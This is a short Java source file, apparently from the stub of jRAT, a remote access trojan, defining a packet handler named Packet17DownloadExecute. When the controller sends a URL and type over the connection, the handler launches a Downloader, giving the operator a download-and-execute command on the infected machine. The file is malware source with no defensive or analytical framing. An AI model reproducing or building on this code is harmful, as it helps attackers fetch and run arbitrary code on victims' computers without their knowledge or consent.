package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = Connection.instance.readLine();
		String type = Connection.instance.readLine();
		boolean readFromSocket = Connection.instance.readBoolean();

		new Downloader(url, false, type, readFromSocket).start();
	}

}